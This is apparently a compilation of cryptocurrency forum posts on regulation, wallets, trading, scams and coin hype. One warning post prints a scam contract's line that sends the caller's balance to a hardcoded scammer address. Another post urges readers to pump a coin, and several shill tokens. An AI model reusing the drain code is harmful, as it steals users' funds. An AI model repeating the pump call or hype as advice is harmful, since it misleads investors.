8300's cannot be autofilled much less filled at all for every DeFi transaction, and certainly not without kyc, and not on a permissionless anonymous system where neither person interacting with the smart contract has any idea who the other human being is, thus you are afelon because you \*literally cannot\* fill out 8300 form. The argument against it simply wouldn't work, and wouldn't allow smart contracts to remain permissionless and open. Let me repeat that one more time, you cannot fill out an 8300 if you do not know who the other person you are trading with is, even if that is an automated market maker script in a smart contract. Your kyc information will be used to deny you service, because US citizen are not allowed to use anything but coinbase.

 If a crypto is not open, permissionless, unconfiscatable, and uncensorable, it is not crypto. This is boomer surveillance regime surveilance capitalism surveillance imperialism. It is not crypto. They want a surveillance regime.

 Censorable, confiscatable white listed backdoors on USDC and Tether, felony fines for any overseas operator offering Terra Stable coin or algo coins without KYC (which will ban US citizen from holding UST or Dai unless Dai is CFTC licensed) 

 What part of "using wasabi and taproot and mining pools and lightning network without kyc makes you a felon" do you not get? This is what 6050I IRS provision, the other infra bill amendment provisions, and Fatf do. Everything that isn't bitcoin get's censored, and bitcoin get's pushed into a corner where if you move wrong to the right or left by 1 inch, you're a felon.

In 2017 and 2021 when bull run took over crypto space and many altcoins joined later some people still keep holding thinking that their altcoins will keep surging and surging. Little did they know that bull season always have short life span when comparing to bear season, bear season can stay for years but bull season is just in months.

Remember that some bought bitcoin at 63k and they have no choice but to hold till these days, imagine all this time waiting just to get back to where you once are. Bitcoin is over 60k now, good for them because they are at the same level since the April.

Know when to get in and know when to get out, don't be a greedy bastard.

I'm currently in a telegram chat with ProBit Support. I had a ZIL deposit go missing 6 weeks ago and I now decided to contact them through Telegram.

In the chat they say there was a hash script error on the deposit/account and that it needs to be synchronized. 

They say I have to connect my Trust wallet with minimum $500 worth of ETH and I can fix the issue with the missing deposit.

I'm wary of this as I've been scammed already with this missing deposit, so fool me twice shame on me.

I'm talking to them about gas fees because I'm literally paying out of pocket fo them to give me my money back.

Is there any truth to what I'm being told or should I just cut my lost ZIL?

Whats the latest story on everyones wallet? What your favorite and why?

There are lots of wallet possibilities out there. All of which may or may not be respectable. Whats not only your favorite wallet but which one do you find works the best? Which one makes transfers and transactions not only better but faster? Smoothest? More reliable? Safest and securest? 

How much do you typically leave on an exchange? When do you decide to move your hard earned crypto to your wallet?

Lets discuss wallets. Ive heard some bad experiences out there. Whats your go to wallet?

Go.

Full Disclosure: I currently only have a paper wallet. Is this bad?

Have you heard of this protocol? It's actually a dex with swaps and liquidity pools, on Harmony blockchain, all combined into a game with great incentives. 

Most TVL project on Harmony, beating Sushi Swap

Devs are super active, like unbealiveable good.

I have been everywhere: eth, bsc, phantom, avx, terra - like every fcking blockhain's defi protocols, and still havent found a better one. Its literally instant smart contract finalisation and literally zero fees.

Not sure if big bag people like hussles with bridging nor if it is worth it, but I would highly suggest checking this thing out.

Also, there are nice catalysts till EOY for Harmony, definitely bullish on it's coin and ecosystem. They are about to give around 300 millions in this/next quater. Ecosystem is growing rapidly.

Imo, the best thing till EOY will be deoplying chailink's oracle to the protocols, which will attract serious whales. And you know what that means

I have bags here, take all of this with a grain of salt, follow your feeling but not emotions! :)

Share your thoughts, goood luck

I'm just dipping my toes into the crypto world the past few days, I posted a couple days ago and came up with a slight plan.

My plan is to invest 15 a week into each BTC/ETH - not sure what percentages to be looking at for DCAing out though.
Also deposit another 30 a month to either buy a dip or trade with - or even let it build up to buy a big dip.

As bitcoin and etherium are priced quite high right now would be a bad time to start this plan? Yes I know DCA means that you buy high and low and it evens out, but as a newbie I'm obviously a little on edge about all of this.

I also like the sound of ADA and DOT, would those be worth investing in too?

Pretty overwhelmed with the amount of information I'm taking in right now hahaha, so any advice would be appreciated.

Also what apps can I DCA on? I've only been able to find it on coinbase but I don't wanna pay their fees. I've got CB Pro, binance, kucoin and kraken downloaded. Any recvpmendations on what's best? I've heard good things about binance.

There is a Russian scammer making his rounds on a Youtube post, referring to a site that has a so called coding error on Binance, and if you send 1btc, it sends back 120ETH. THIS IS A SCAM, DO NOT USE IT, TOUCH IT, PUT INFO IN IT.  


I checked Whois and the site was registered a month ago. Him and his degen friends are now telling people there's a glitch. YOU ARE THE GLITCH IF YOU BELIEVE IT.

Hello fellas,

as per the title, can someone explain me how exactly the rugpull worked? I just don't fully understand how a DEX operates, I guess.

What I (think) understand is that if a token is placed in an exchange, the liquidity pool determines the market cap, hence the price of the token is (number of tokens/market cap). Now, new people buying the said token will increase the liquidity pool, hence increasing the MC and therefore increasing the price. Am I correct so far?

How  does the dev team pull all the liquidity from the exchange? shouldn't they be able to sell only the tokens they own? in this case I would assume they could take away a lot of the liquidity, but it would be proportionate right? plus, in case of the squid token, how exactly did they stop people from selling? 

All the articles I see are pretty vague, so I was wondering if there is some expert that can explain it better to me, please don't be afraid to be technical, that will only prompt me to do some more research and learn more, which is my favourite pastime lol

Last week I made a post asking for this forum to pump Amp as it was the least expensive coin available on Coinbase.

Since that post I am happy to report that I made 80% gains because, Im assuming, a bored billionaire reading r/cryptocurrency on the toilet took my suggestion and decided to pump the coin.  Heres to you Crypto Investor Barron!  The hundreds I made pale in comparison to your millions but each little bit counts towards building my empire.

And now that Ive cashed out my initial investment and have thousands of free Amp coins Im asking you to do your thing one more time!

Lets pump Adventure Gold.  Its on Coinbase, and it just got dumped by someone else.  Its price it nearing its week low and aside from one dip, its month low too.  Its also been more than 50% higher a few times recently so, yeah, its quite pumpable with its sub 200 million market cap.

We dont even need a bored billionaire to pump this one.  Maybe a bored NBA player on a max deal?  I know you got time Ben Simmons.  

Anyway, lets pump Adventure Gold and make some money.  Reddit  do your thing!

As the crypto-sphere is increasing, there are more oppourtunities for scams, rug pulls and shills to make money from the less experienced crypto traders/hodlers. This is a time where we can make immense profits from good projects.... but also the wild west of crypto where some will get burned because of a well worded post about the new doge-baby-shib-kinu-swap-shiseter coin that will 1000X in the next hour. Be careful peeps and don't think every coin on crypto moon shots or similar subs will make you an instant millionaire. DYOR.... vigorously!

As the title asks, if you randomly got around $1000 that you didn't need for living expenses which crypto would you put it in? Would you stake it? Invest it all on one? It isnt that much money but you could still do a lot with it.

I feel like most of the conversation is dominated by bitcoin and ether and I wanted to see if anyone had any other hidden gems? I also wanted to see if Shiba/Doge got any love because I feel like they have had their moment. I am very interested in seeing varying priorities. 

You dont have to put it all in one place either! Feel free to split up the $1k as much as you want.

Alright crypto alley, what's the deal with this shit. On binance every project says warm. But the APY on some of them are fucking crazy, look at this shit:

CLOVER FINANCE APY: 2603.29%
LITENTRY : 1335.73%
BIFROST : 1245.98%
EFINITY: 1014.27%

While others have more credible or "normal" APYs like:

MOONBEAM: 56.97%
PARALLEL: 398.6%

The rest doesn't show, so i wouldn't know what to say. I'm sure every project has a good team/ideas behind, but you gotta choose. What do you guys think about this? Any insight regarding to the projects, please share your knowledge as i am interested in supporting this.

Be safe and pray for the bear!

I constantly hear people shilling their favorite coins, but this got me thinking, how many of these coins will actually survive if a bear cycle hits?. I feel like 90% of the coins being shilled today wont survive the next cycle. What do you think? At this point i think its a given that Eth and Btc will both survive but idk how many others will. Coins like Shib and other meme coins may die. Eth 2.0 (whenever that comes out) might kill a lot of coins as well. But yeah, just wanted to put this idea out there and get you to think about your investments and whether they will actually last. Id love to hear everyones opinion

Hello there!
A lot of you probably know that CMC emails got leaked, but no passwords etc. Even if that is true, your email is enough to cause trouble!

Email phishing:
You will 99% receive spam emails that will try to phish your information for exchanges or banking. Don't fall for this. Do not open any email that you didn't use to get before the leak. Do not open any link that might say something about your wallet or your exchange. Always double and triple check the email addresses that send you the email and even then make sure the content of the email is safe.

Social Media:
If you used the same email for social media accounts, they might try to get into them. You should change your passwords and if it bothers you even more, make a new email for your social media.

Exchanges:
If your email got leaked and it is associated with any exchange, change your passwords and even change the email too. Enable 2FA, preferably with an Authenticator.

TLDR: If you don't feel safe with the leaked email anymore, make a new one and replace your old one from any platform you want. I suggest changing it everywhere.

I have a friend (more of an acquaintance) that will share with me his insane crypto and NFT gains. To preface, I think he actually could be a compulsive liar. Ive caught him in MANY random weird lies in the past (non-crypto related). I feel embarrassed for him, I dont call him out. Ill just say, Oh wow, awesome! or nod and smile. Sometimes I just wont respond. Its now getting absolutely absurd the shit he is sending me. At first, I thought the crypto gains were cool and I wasnt surprised given the market, but it also got strange to me that he was sharing these crazy profits with someone he wasnt close to. He also has been in the space for less than year. 

One time, I looked up an NFT he sent me. It shows his username in the purchase history and it became immediately clear to me that he was lying about what he bought and sold it for. He told me he bought it for 0.06 ETH and sold it for 4 ETH, but the purchase history said he bought it for 2.7 ETH and was asking for 4 ETH. Another time he told me he owned 500k worth of a coin, which didnt seem to add up knowing the economics for the coin/timing of purchase. The top holder for the coin (not his address or the main wallet) was listed as owning 300k. MAYBE its possible there were system changes and he could be telling the truth. But if so, why share these profits? Seems a little dangerous for people to know.

Anyways, I take everything he says with a grain of salt now. It actually can be pretty entertaining how crazy it is. But now, im getting annoyed by it. I want to call him out because im sick of the fake flexing. However, I dont want to fuel the fire and make it seem like I ACTUALLY care (which I guess I kinda do now because its getting so whack..). 

Has anyone else experienced a crypto liar? Is this normal in this space...? Would you call someone out or just ignore it?

Here's the image that gives a great overview of this project...


https://i.redd.it/6r2ju61xq7t71.jpg


""**TEAM**

Kunitake Ando- Former President and COO of Sony Corporation.

Kuzumasa Sato- Operating officer of Sony Marketing and President of Sony Style Co.

Masanobu Yoshida- President of Sony Handheld, Sony Ericsson Mobile Communications.

There are more but this is the core.

**VISION**

We aim to realize a data democracy by building a decentralized, democratic world where data is protected as inherently owned by each individual.

Basically, JASMY is trying to solve the problem of centralized consumer data. IoT collected data, from our phones, laptops, smart homes, etc. is given/sold to companies for stats and products on a regular basis. All that data is on centralized entities leaving it vulnerable to massive data breaches, inaccurate statistics, and more. Centralized consumer data also takes away the power to share data from the consumer (us). We get very little choices on how our data is shared. JASMY wants to solve this by decentralizing data utilizing blockchain technology.

**ROADMAP/PARTNERSHIPS**

According to the whitepaper they launched the JASMY initiative to accelerate adoption by working with companies willing to take the lead in this project. This actually launched back in January 2019 which means they have been working on this for a while fine tuning their platform.

Okay, this is actually HUGE. JASMY partnered with Toyota and Witz in JUNE. Witz develops automated driving technologies and IoT for companies like Toyota and Panasonic and in June they revealed that theyre working on JASMYs blockchain platform! This is crazy. Was not expecting that.""


I think this is a project we all should be backing

Taproot mixing? You're hosed, you become a felon for using Wasabi. Mining pools that aren't doxxed? Felony. NFTs &gt;10k, you go to jail. Programming payments in installments to keep sums &lt;10k, also a felony. *Writing software* even some .js app logic in a wallet to assist, jail.

Wake up folks this is not a drill. I only saw 1 person who is a mutual raising alarm bells about this for months. Now Laura Shin covered it and I read the thing: wow! We're two days away from losing everything. US persons will become completely cut out, residents and citizens.

Soon the only way a person born in the USA will be able to do *anything* in any scale with these technologies, without KYCing everyone or becoming a felon, will be to a) leave and b) operate with a non-US entity and ideally non-US employees/directors.

Then: we'll have to globally adopt some kind of decentralized minimal KYC with encrypted/blinded PoR (no home address dox, but can confirm not US) and we just turn our backs to US persons. Rest of world has spectrum of more financial freedoms/reg. requirements. This is the future

The way to avoid this scenario where US persons are living under harsh capital controls, is to raise a ruckus like we did in July, remove 6050I from infra. bill, we have &lt;2 days.

We need to act today November 4th to prevent this bill from passing unchanged tomorrow November 5th.

I've invested in btc and eth around 4 weeks ago and have been dca. I've been trying to buy into these dips but it seems like they just keep going down,  this isn't a bear market is it? Like I think it's smart not to sell and to rather but into a dip, but if it's a bear market starting idk. What's up are these price drops normal whenever all time highs are reached or something? 

Sorry If this is an annoying question I don't mean it , I'm just very ignorant of this field and looking for some advice so I don't mistakenly panic sell :)

SOOO.. stumbled across this article from 1920's about Energy Currency

Henry Ford proposed this in 1921, to have a currency backed by energy for the world and stop WW.

I wonder what stopped him from pursuing the idea.??? take a guess

There are some crypto related websites that I read on a daily basis. They always share the latest and credible crypto news. But often news websites publish predictions or analysis about the market. They share the analysis they make every week, and on average the analysis they make seems like the market will always be positive.

Seeing all that, I wondered if anyone believe the analysis shared by news websites. I personally see their analysis as less realistic. Every prediction they share is too pushy, such as the shilling effort for a certain coin. What do you guys think? 

Also, I would like to you to share the news sources you check. Thanks in advance, my fellow moon hodlers.

Inspired by a similar post of the twin peaks thread (David Lynch's series which is amazing if you haven't seen it go check it out). So after shilling a TV series for the first time in this sub let's continue. 

First of all I will flair this as comedy so I don't get criticized for moonfarming by the keyboard warriors. Yes, YOU. 

Now to the fun part, let's see if you can describe your favorite coin with an emoji and let others find it. Or it doesn't have to be your favorite just use your imagination and be funny. Please don't just post a dog because it's easy and this is a hugely important post... Humor is a good thing my friends. I hate negativity though so please just downvote if you feel so and bye. Thanks

I mean at this point is it even possible unless youre already wealthy? 

First off, Im not an anti-coiner. I have about 30% of my money in btc/eth. Im fascinated by crypto and Im just trying to learn as much as I can right now.

But honestly, even if theres a best case scenario of a 10x, 20x, or 30x, how much does that do for people like me? 

Lets say I have 500-1000 usd invested. So best case scenario, Bitcoin becomes the globally accepted currency, and now I have 15-30 grand. 

Im just trying to put the numbers together in my head and its not making sense. Any feedback is appreciated. Not trying to make a point, Im just trying to figure this out.

Ok so the story goes as follows a (to this day at least) considerate degenerate about my funds saw that i was down from a tried under 5x futures trade so as a normal man would do i went all win changing my cryptos into usdt and gambling away to 10x (it worked surprisingly well). Then another great idea sparked my mind "how about more , it s faster isnt it".... yeah it wasnt a great idea and now im down to 1/4 of my portfolio. AMA also Any tips to make it back?

PS the flair is how im now seeing my past actions

PPS some low cap altcoins recommendations for my dumb self?

Hi everyone, sorry if I am really late to the party on this one, but in case anyone else is also late, please check this out. 
 Ive been using Luno for a year-ish,  since  Coinbase kept going down when cryptos were surging. 
Ive made countless transactions from my bank to Luno but today I made a bigger one, and my bank stopped the transfer.
They said Luno is not registered with the FCA and of course had no interest whatsoever in my explanation of why that is not surprising.
Theyve frozen my bank account and banking app and told me to wait up to 48 hours for a call back from their security team. 
I asked if I cancel the transaction , will they lift the account freeze and they said no, the transaction is denied already, the money is in my bank account but only my will cards work, and I wont have access to make other deposits or use any of my online banking facilities until their gestapo have satisfied themselves. What they need to satisfy themselves about I dont know, theres no active transaction to scrutinise.  So theyre holding my money for no reason.  My bank cards have daily limits like everyone does, and Ive lost the ability to send money digitally until they unlock me. So I cant get that money until they unlock it. 
I mean thats why I got into cryptocurrency in the first place because stuff like this absolutely incenses / terrifies me but I thought others should know about this. It wasnt an issue for smaller amounts but as soon as it looked like I was sending something more significant,  they shut me right down.
The bank by the way is Santander. Ive just opened a Revolut account as they look much more Crypto friendly.

This is a follow up/update of a post I made around 2 weeks ago.  
  
TL;DR 2miners.com pool offers ETH mining [payouts in BTC and NANO](https://eth.2miners.com/help) to undercut ETH tx fees big time  
  
Some of you might not know this yet. Plus there's a lot more data about it.  
Here's the thing:  
if you are a small (ETH) miner and want regular payouts to your own wallet (or an exchange wallet) without paying much or any fees, consider joining 2miners.  
Thousands of other miners already joined 2miners because of the new payout system!  
There are other pools with other solutions. This solution here works on layer 1, but in a different way than you might expect ;)  
  
Some background: on October 11, 2021 2miners.com announced that they'd launch a [new payout system](https://2miners.com/blog/how-to-get-payouts-for-ethereum-mining-without-fees/), which allows miners to receive payouts in BTC and NANO in order to avoid ETH fees partially or altogether.  
BTC tx fees are quite low right now, this isn't guaranteed to be always the case.  
If you want to evade tx fees for good, opting for NANO payouts at [https://eth.2miners.com/](https://eth.2miners.com/) should be your choice.  
With BTC you have more exchanges that offer trading pairs, though.  
Either way you're much better off than with gas fees on ETH layer 1.  
  
That much about the why and how. Now let's get to the data.    
Ever since that announcement the number of miners, who decided to pick one of these options, has been increasing.  
Day after day hundreds of miners join the pool and receive their mining proceeds in BTC or NANO.  
The number of miners, that are currently mining ETH at 2miners and receive BTC or NANO, approach 20,000!  
Over $1M have been paid out in NANO (with 0 fee) and even more in BTC (with tiny fees), so far.  
  
Here's some stats (taken from [https://eth.2miners.com/miners](https://eth.2miners.com/miners)) over the course of the weeks (I've missed the first few days - sry).  
If you a prefer a diagram of that data to the following table, have a look here: https://imgur.com/a/GUrDRmb

So I have been testing swapping shitcoins using BNB and metamask. When you see massive gains and get fomo, just pause for a second and realize it will be extremely difficult if impossible to swap/sell these shitcoins for anything near what you think they are worth. 

To get any of these, first off the slippage has to be at least 12%. Acquiring these is fairly easy and the transaction usually goes through after a few tries but good luck trying to swap back. This takes much longer for the few times Ive tried (I know, small sample size), but it often fails to transact and then you are stuck with the gas fee (thankfully on Binance Chain its next to nothing). 

So yes seeing your crap skyrocket 10,000% is great, but due to liquidity, chances are there is no way you get anywhere near that gain when you actually try and swap back to a real coin.

The last couple weeks, all my crypto subreddits keep hyping about November's expected big bull run as if it's written in stone. From what I can tell, October had a rather decent run already. Other than expecting the bull run from the thought that "November is historically good for crypto", is there any other reason for this? 

Honestly, I can't help but think we actually.might be near the top of the latest bull run, and that the next few weeks we might see a pull back. Can anyone give solid arguments for an ever bigger bullrun coming? Are we going.to get the rug pulled soon?

Ok so the story goes as follows a (to this day at least) considerate degenerate about my funds saw that i was down from a tried under 5x futures trade so as a normal man would do i went all win changing my  cryptos into usdt and gambling away to 10x (it worked surprisingly well). Then another great idea sparked my mind "how about more , it s faster isnt it".... yeah it wasnt a great idea and now im down to 1/4 of my portfolio. AMA also Any tips to make it back?

PS the flair is how im now seeing my past actions

Not sure if this information has found it's way over here yet, but this is even more smoke indicating the fire that would be a GME partnership.

With the possibility of news leaking tomorrow, this could be a quick buy the rumor sell the news type of event.

I recently sold an asset, so Ive got a bit of cash to invest in crypto.
Im looking for some promising alt coin projects to look into with the intent to HODL. I will do my own research on each project, but a tidbit or two would be appreciated (why do you like the project/ why will it last?)
Already on my radar are : ETH, VET, ONE &amp; ALGO. 
Any other suggestions would be much appreciated. Thanks!

I know that in stock markets, the buy order/sell orders have an impact on the market price of a stock. News and potential dividend payouts could also drive up the price of a share but isn't it mainly the demand and supply of a particular stock is the main driver for the price of a stock?

I am always curious how does the price mechanism work for a cryptocurrency on a CEX.

What makes the price of a crypto go up and down? From what I understand above, the main driver should be just the demand and supply of a token. Are there any factors that drive it? Is there a formula that CEX use to determine the price?

I am seeing a LOT of negative sentiments, paper hands, and nearsighted traders in the daily today. That's ok, a lot of you are new to the crypto environment, and I'm not going to shame you for something you haven't experienced before.

THAT BEING SAID. I would like to provide some perspective on what one day of red looks like compared to the past 12 months.

**BTC** \- down 1.27% (-$858) in the past 24 hrs. **Up 292% (+$45,603) in the past 12 months**

**ETH** \- down 0.89% (-$32) in the past 24 hrs. **Up 987% (+$4089) in the past 12 months**

**LTC** \- down 0.20% (-$1) in the past 24 hrs. **Up 244% (+$142) in the past 12 months**

**SOL** \- up 6.82% (+$16) in the past 24 hrs. **Up 17,140% (+$240) in the past 12 months**

**SHIB** \- down 29.35% (-$0.00002) in the past 24 hrs. **Up \~4528% ($0.000045) in the past 12 months**

**LRC** \- down 15.93% ($0.22) in the past 24 hrs. **Up 816% ($0.98) in the past 12 months**

&amp;#x200B;

I could go on and on. But the point is....these prices fluctuate, consolidate, crypto...ate. This is what they do. Enjoy the ride, support the projects you believe in. And as always, buy high, sell low.

This is a topic I've always wondered about regarding most people involved with crypto. A friend got me into crypto and now I'm balls deep, learning about staking, mining, lending, NFTS, DAPPS, the whole nine yards. I feel like Crypto is going to be one of the most important industries from now on and will help connect various different industries through new innovation. I think the lightning network, Defi, and the Metaverse are going to be the biggest things. What got you guys into crypto and where do you see it going?

Always keep this in mind!

In your Crypto Journey, there will be volatile times. 
Sometimes you are 100% up and sometimes you go 30% down. But the chart will always look like it's going zigzag in an uptrend.
Some big W's later it can go a sideways a bit,
Some M's in the downtrend, then sometimes a parabolic run for a bit. 
Then after some sell offs it resumes its journey.

Crypto will always be like this.
Just keep in mind the place from where you started.

What goes up, comes down! And what comes down will always go up!

Just be in it for the long run!

Good luck people!

If Ethereum was on the stock market it would be in 12th however Google and Berkshire Hathaway both have 2 stock listings in the top 10. You could class Bitcoin as a company which would knock Ethereum down a place but i don't.

With a current market cap of $540 billion it is roughly

2x Nike
3x McDonalds
4x BlackRock and Goldman Sachs

Household names, yet all i see in the news is Bitcoin or shitcoins. Do they not want to have to try and explain blockchain?

For those that think bubble and crash, there are so many ways to engage now other than just buying and hodling. Crypto isn't just making noise like previous hype cycles, in the last year it's started talking and proving what it can do. 

Companies from the more obvious like game devs to the less obvious like supermarkets have been recruiting blockchain specialists. I expect fluctuations of course but i think the massive boom bust cycles are over, at least for legitimate projects like Ethereum.

According to Coinmarketcap, it is up 620% in the past 24 hours?!

Surely this has been in the media enough for people to have wisened up to the incredibly lucrative scam (for the creators mainly) that was the project.

You can't even cash out if you do make money; all you can do is buy.

I know there have been an incredibly high number of posts regarding this project being posted here over the past few days, but at the moment it is still displayed in the top 3 gainers on the coinmarketcap home page; and seeing as CMC is effectively the go-to for prices for a great many crypto followers, I just thought it was worth once more reiterating: DON'T BUY THIS CRAP, it's worse than betting on an average unknown token atm. You might as well throw your money away.

I love Binance, the interface is great, the tools are great and BNB is a monster. 

Yet, I can't resolve myself to go back to their service. I'm currently using Coinbase Pro which is honestly horrendous as an interface for one reason only. If I need my money back, I have it in 3 days max. 

I can't believe that they have not found a way to get Sepa back. It is 'temporarily disabled' since July. 

Binance is for me the best platform to trade, and learn. Their Binance academy program is great, their staking is secure and frankly as far as exchanges go they could dominate the game in Europe. But their lack of understanding that we want to be able to get our money back even if we use a MasterCard is unjustified. 

I deeply want to be their customer again but I can't because of this issue...

Hey guys!

I don't post that often, but now I'm doing it for a very good friend who launched his token called NARCS. He's now trying to get the token listed on CMC and Coingecko. He is very optimistic about his future projects with this game, don't know why, not into gaming or stuff... ( LOL ). If you think he could get help from the community to get started, take a look at:

Which coin did you lose the most money on? For me it was ETH, even tho it's now at an all time high. In September I bought a lot of ETH and then the market crashed, so I panic sold, thinking: "Oh no, this is probably the bear market everyone has been talking about."

Then I bought back at a higher price, which did reduce my loss, because I did profit this time. But what coin did you lose the most money on? And did you lose money because you fomo'ed or because it was a shitcoin that went to 0?

I am a pretty conservative investor, so I have not gambled on shitcoins... yet. But I do think it's interesting to hear from you guys, so that we can learn from it :)

 So who here is following the launchpad of this awesome game called Mines of Dalarnia?

[https://www.minesofdalarnia.com/](https://www.minesofdalarnia.com/)

Basically it will be a mining game where you can buy plots of land (huge opportunity) and rent it afterwards. 

$DAR have already a trading volume of over U$700 million, after only 6 hours of trading. Binance is offering a 30 day farming period for staking BNB or BUSD and earn DAR. But only 7% APY, so unless you have a big chunk of BNB it won't yield a lot.

What are your thoughts and hopes about this new project? I know i'm excited and can't wait for the game to debut next year! Feels like beeing a pioneer to buy a coin the 1st hour it kicked off.

Also, this game reminds me of my good old days playing Motherload at Kongregate... ahh, those were the times...

I have an automated trading strategy, but KuCoin seems to be the only crypto platform where  I could get someone to program the strategy to. 

I usually use pro.coinbase.com, but I don't know where to find a person who can program automated trades there.

So I don't mind going ahead with KuCoin but I've heard some criticism of it here. I just had the following questions:

(1.A) Can I use KuCoin to get reliable trades without some fault occurring from the side of the system?
(2.A) Can I conveniently withdraw and transfer money into my KuCoin account from my bank account?
(3.A) On a scale of 1 to 10, how reliable is KuCoin? 10 being most reliable.
(4.A) Have any of you had any bad experience with it?

....
(1.B) Where can I find programmers who can program my automated trading strategy in other platforms like pro.coinbase.com or something else?

Thank you

This is not a financial advice at all, Im saying this because Im done with the hype meme coins are getting. I mean, Shib was dipping today, and Shib community started blaming the exchanges for that, and they still expect it to fly to the moon because its a good investment. I have no hate for meme coins, but what do they really stand for?

I think we should instead be focusing on putting our money in companies with real fundamentals. Projects that have the ability to do something special, and we have witnessed a few. Im a big fan of MATIC for example. This is a coin that stands for one of the most efficient and effective projects around the cryptocurrency market scene. 

I think that these coins are not getting enough credit in the meantime, people are hyping coins that got their momentum because of a tweet or a viral image on social media. Its okay to follow the trends sometime, but we cant create a trend and follow it, and expect to make money out of it. 

In the end, I wish you all make the gains you deserve boiz. Were all here to invest in what were passionate about. Just had to let out what has been in my mind for a while now, have a good day and goodluck lads!

Burger King has released a new promotion where they are randomly giving away Eth, Btc or Doge with certain purchases. Here is the kicker, you have to have Robinhood to claim the prizes. I l, like many others, have never owned Robinhood and despise it for all the reason many of is do. My question is, is it worth downloading Robinhood and setting up and account? 

Also before I download Robinhood, If i dont win any free crypto, am i able to just resign that robinhood account? Im curious about these answers before I turn into a whopper eating machine and download an app i am binded to to for life.
  
Any feedback would be greatly appreciated. Thanks again, you guys are the greatest. LFG

ew days ago, I told everyone to short Shiba when your taxi driver and barber starts talking about it. Because this was the sign of peak hype and usually you should short it. I even gave advice on shorting it on FTX.

I've seen this before. When many people are talking about crypto, people that never care about crypto, start talking about it, start selling it or shorting it. You can buy it again later when the hype dies down but you should always be careful when mainstream media and everyone starts talking about any crypto.

I don't know my post was removed because it's important knowledge for everyone here to recognize when you are in a bubble to withdraw from the market or short it.

The whales will do it so why won't you? Recognize the sign of peak hype and withdraw. If your non crypto friend, barber or taxi driver starts discussing a crypto, sell it or short it.

Not unique I am sure but I was listening to some executive, who it was escapes my mind, last night, and he was railing against crypto.  How its a ponzi scheme, fake tech and yada yada yada.  He was in banking so I immediately googled investments by banks in crypto.  Oh they all are doing it, and creating avenues for their bigger customers to invest.  So when these mouth pieces for pure capitalism are out there talking down crypto, just remember, they are telling the people its not a good thing so they can protect their control, they know its the future, it is the future.

I dont discuss crypto with anyone apart from my family but theres been a lot of people around me who are apparently super jelly of early crypto investors. I keep hearing their complaints about how early btc or eth investors are sitting on millions and millions of bucks. And in the same breath these very lads still fear crypto like its some kind of virus or something. They dont even have the slighest will to learn what it is. Its so hypocritical.  

When asked why arent they investing its usually too expensive already, too dangerous, they will hack me or the good ol itll all go down to 0 next year. 

Dude.. open a browser, buy a few bucks of whatever coin you want and thats it. No one is preventing anyone from investing but themselves. They claim its risky and then they pull out their phone to bet on their football team. Dude

Hello everyone, while searching for arbitrage videos I found this scam. 

There is a video called [500x Ethereum Flash Loan Arbitrage - Huge Profit Automatically Trading - Smart Contract in Desc.](https://www.youtube.com/watch?v=zb3ASoleFDY) on Youtube. In theory, this code is supposed to create a new token, add it to Pancakeswap (or Uniswap (their ETH address shows similar ETH transfers)), provide liquidity (this is where they get your money), then a bot will buy your token blah blah.

&amp;#x200B;

However, once you check the [given code in the comments](https://gateway.pinata.cloud/ipfs/QmYfvg4p4SPB7D1WSKDPVSg627LrJwAJtxzFStRVioMqFc), it's mostly commented out. The only place that isn't is this line:

    address(uint160(manager.swapDepositAddress())).transfer(address(this).balance);

All this code does is, make a transfer to supposedly "swapDepositAddress," which is just their address. Once you follow where the "manager" comes from, you find [this code repo](https://github.com/uni-swap/uniswap-core/blob/master/contracts/interfaces/IUniswapPair.sol) with a fake Uniswap account. Again, most of that code is empty/commented out, and the only thing that isn't is this block of code:

    function swapDepositAddress() public pure returns (address) {
            return 0x57908d78F35f6d274E6A46520C3d6842A6683Ab9;
    }

As we can see, once the contract we created calls "manager.swapDepositAddress," we get this web3 address. You can check their internal transactions on [BscScan](https://bscscan.com/address/0x57908d78F35f6d274E6A46520C3d6842A6683Ab9#internaltx) and [EtherScan](https://etherscan.io/address/0x57908d78F35f6d274E6A46520C3d6842A6683Ab9#internaltx), and see how much they scammed people. It seems not too much, but it can damaging to those living in countries with weak currencies. Also, there are multiple instances of this scam, so DO NOT EVER COPY AND RUN A CODE YOU DO NOT UNDERSTAND.

My original investment was $200 (AUD), and I made $40. I put another $40 in, and the next thing I know, I'm down to $210 ($30 lower than my original investment).

My knowledge on stocks and cryptocurrency isn't that great. I sold around $105 and kept around $105.

I currently have about $42 worth of Shiba Inu.

Should I just hold onto it, or cut my losses and keep the $42?

While Zucky golden boy is working on building the "biggest" creation of the mankind, people still dont have an idea on what this "Metaverse" thingy actually is?

Sure we know it is the future, but whats more? Is it something like Virtual Reality or Augmented Reality? Or even both? Can i be Shrek in here?

And the answer is, drum rolls please.. Nobody knows.

Metaverse is planned to be the biggest challenge that humanity has ever took so far, and its unbelievably incredible that a company as big as Facebook (now Meta) is willing to use their resources on this quest!

BUT, do not forget, Metaverse is NOT an app, it WON'T gonna be a companies product, it WON'T gonna be centralized, and thats where my and, many others concern kicks in...

See, the easiest way to Imagine the Metaverse, would be an advanced version of the Internet, the one that you're using to read this.

And it frightens me that soon people start to think Metaverse is Facebook's (now Meta) product!

Its like those people who call the Internet "Google", but this one is even worse cause Facebook (now Meta) will be THE company to take the credit! whereas Google is only a search engine!

And thats where our beloved Coins comes in...

If everything goes as planned, the Metaverse has potential to be a completely whole new world, a world with a new currency... The currency of the Internet. 

And if Zuckerberg wants to take the full control over the Metaverse, he will likely want to control the Crypto as well.

And if we let him wield power over the Crypto like we did to Elon which, love him or not, he currently has the biggest single influence on the market, then were in a big fuck!

So what you can do avoid all of this? Simple: dont Invest in projects they shill... I know its too much to ask  avoiding 10X Shit-Coins, but if Zucky boy is planning on entering the Crypto space, which is where im betting my $2 at, then we must do anything but giving him the same powers that the Elon has.

cause even though Elon is a shady businessman, Zuckerberg is a shady space lizard...

Stay safe, Love y'all!

My original investment was $200 (AUD), and I made $40. I put another $40 in, and the next thing I know, I'm down to $210 ($30 lower than my original investment).

My knowledge on stocks and cryptocurrency isn't that great. I sold around $105 and kept around $105.

I currently have about $42 worth of Shiba Inu.

Should I just hold onto it, or cut my losses and keep the $42?

**Aries** 

You are fearless, which is a positive trait to have during a hugely anticipated bull run. People take notice in your confidence, and so they will try and imitate your portfolio and closely monitor what you say; Attempting to interpret every detail into their own success.

Your independent nature and confidence helps you carry the torch in your investments. This is a quality to uphold, because as a great leader, you may find yourself first in the door on those big gains, where others may feel left out.

Be wary of your inconsistencies. You have few negative traits, but they can complicate your decisions without notice. If you allow self-obsession to cloud your judgement, you can really set yourself back and degrade the high value of your qualities.

&amp;#x200B;

**Taurus** 

